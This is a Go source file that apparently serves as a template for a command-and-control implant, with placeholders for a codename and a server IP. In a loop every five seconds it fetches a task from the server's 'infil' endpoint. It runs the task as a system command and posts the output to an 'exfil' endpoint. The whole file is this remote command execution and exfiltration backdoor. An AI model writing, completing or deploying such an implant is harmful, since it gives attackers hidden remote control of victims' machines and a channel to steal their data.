package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"time"
)

var codename string = "<codename>"
var serverip string = "<serverip>"

func main() {
	for true {
		time.Sleep(5 * time.Second)

		// Get Command from Server
		data, err := get_data(serverip + "/infil/" + codename)
		if err != nil {
			continue
		}

		// Parsing response to dict
		task_id := fmt.Sprintf("%v", data["task_id"])
		command := fmt.Sprintf("%v", data["task_cmd"])

		// Validate response
		if task_id != "<nil>" {
			result, err := runCommand(command)
			if err != nil {
				continue
			}
			exfil_body, _ := json.Marshal(map[string]string{
				"task_id": task_id,
				"result":  result,
			})
			send_data(serverip+"/exfil/"+codename, exfil_body)
		}
	}
}

func send_data(url string, exfil_body []byte) {
	responseBody := bytes.NewBuffer(exfil_body)
	res, err := http.Post(url, "application/json", responseBody)
	if err != nil {
		log.Fatalln(err)
	}
	res.Body.Close()
}

func get_data(url string) (map[string]interface{}, error) {
	res, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}
	rawdata, _ := ioutil.ReadAll(res.Body)
	res.Body.Close()
	data, err := parse_data(string(rawdata))
	if err != nil {
		return data, err
	}
	return data, nil
}

func parse_data(inputdata string) (map[string]interface{}, error) {
	var data map[string]interface{}
	err := json.Unmarshal([]byte(inputdata), &data)
	if err != nil {
		return data, err
	}
	return data, nil
}

func runCommand(cmd string) (string, error) {
	cmdObj := exec.Command(cmd)
	stdout, err := cmdObj.Output()
	if err != nil {
		log.Fatalln(err)
		return "", err
	}
	return string(stdout), nil
}
